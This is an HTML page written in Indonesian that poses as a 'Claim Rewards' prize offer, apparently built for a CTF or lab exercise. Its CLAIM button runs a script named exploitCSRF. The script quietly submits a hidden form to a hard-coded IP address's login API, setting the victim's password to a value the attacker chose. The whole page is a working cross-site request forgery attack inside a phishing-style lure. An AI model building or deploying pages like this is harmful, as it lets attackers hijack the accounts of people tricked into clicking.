<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Rewards</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="d-flex justify-content-center align-items-center vh-100">
    <div class="card text-center shadow p-4" style="max-width: 400px;">
        <h5 class="card-title">🎉 Claim Rewards Anda!</h5>
        <p class="card-text">Dapatkan hadiah Anda dengan mengklik tombol di bawah ini:</p>
        <button class="btn btn-primary mt-3" onclick="exploitCSRF()">CLAIM</button>
    </div>

    <script type="text/javascript">
        function exploitCSRF() {
            var url = "http://82.197.68.85:38259/api/routes/api.php?route=login";
            var newPass = "qwerty123"; // password baru dari penyerang

            var form = document.createElement('form');
            form.action = url;
            form.method = 'POST';

            var passField = document.createElement('input');
            passField.type = 'hidden';
            passField.name = 'pass';
            passField.value = newPass;

            form.appendChild(passField);
            document.body.appendChild(form);
            form.submit();
        }
    </script>
</body>
